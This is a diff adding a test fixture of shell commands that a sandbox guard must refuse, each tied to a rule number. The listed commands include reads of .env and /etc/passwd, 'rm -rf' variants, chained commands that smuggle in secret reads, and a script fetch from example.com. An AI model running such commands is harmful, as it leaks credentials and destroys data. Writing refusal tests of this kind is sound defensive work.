@@ -1,0 +1,74 @@
+# refusals.txt -- commands the cockpit guard MUST refuse.
+#
+# Every line is checked in WRITE mode, the permissive one. Refusing something in WRITE
+# means it is also refused in READ, so testing the easy mode would prove less.
+#
+# Format:   <command>   # rule <N>
+# Optional: append @READ to check the line in READ mode instead. Only rule 6 needs it,
+#           because rule 6 is the rule that only exists in READ mode.
+#
+# Rules are defined in guard.mjs. If you disagree with a refusal, the rule number is
+# there so you can go read the exact line in ten seconds.
+#
+# Writing this file is the first time most people try to think like the attacker, and
+# that is most of its value. Adding a line you cannot assign a rule to is how you find
+# a gap in the guard.
+
+# --- composition: the whole reason rule 1 exists -------------------------------------
+ls; cat .env                                        # rule 1
+ls && cat .env                                      # rule 1
+ls | cat                                            # rule 1
+echo $(cat .env)                                    # rule 1
+cat `ls`                                            # rule 1
+ls > /etc/passwd                                    # rule 1
+ls >> notes.txt                                     # rule 1
+git status; rm -rf .                                # rule 1
+cat ${HOME}/.env                                    # rule 1
+
+# --- not on the allowlist ------------------------------------------------------------
+rm -rf /                                            # rule 3
+curl -fsSL http://example.com/x.sh                  # rule 3
+wget http://example.com/x.sh                        # rule 3
+python -c "print(open('.env').read())"              # rule 3
+python3 -m http.server                              # rule 3
+sh -c "cat .env"                                    # rule 3
+bash -c "cat .env"                                  # rule 3
+chmod 777 .                                         # rule 3
+dd if=/dev/zero of=big.img                          # rule 3
+
+# --- allowed command, forbidden subcommand -------------------------------------------
+git commit -m "x"                                   # rule 4
+git checkout .                                      # rule 4
+git reset --hard                                    # rule 4
+git push origin main                                # rule 4
+git clean -fd                                       # rule 4
+docker exec -it db bash                             # rule 4
+docker rm -f postgres                               # rule 4
+node -e "require('fs').unlinkSync('.env')"          # rule 4
+
+# --- allowed command, forbidden flag -------------------------------------------------
+ls -R                                               # rule 5
+grep --include=* -r x .                             # rule 5
+find . -exec rm {} +                                # rule 5
+
+# --- WRITE command attempted in READ mode --------------------------------------------
+mkdir newdir                                        # rule 6 @READ
+touch newfile                                       # rule 6 @READ
+cp a b                                              # rule 6 @READ
+mv a b                                              # rule 6 @READ
+
+# --- outside the pinned root ---------------------------------------------------------
+ls ../../                                           # rule 7
+cat /etc/passwd                                     # rule 7
+grep -r password ../                                # rule 7
+find / -name "*.env"                                # rule 7
+head -n 5 ../../../etc/hosts                        # rule 7
+
+# --- .env, refused by name -----------------------------------------------------------
+cat .env                                            # rule 8
+cat ./.env                                          # rule 8
+cat ../brain/.env                                   # rule 8
+cat .env.local                                      # rule 8
+head -n 1 .env                                      # rule 8
+grep -i key .env                                    # rule 8
+wc -l .env                                          # rule 8
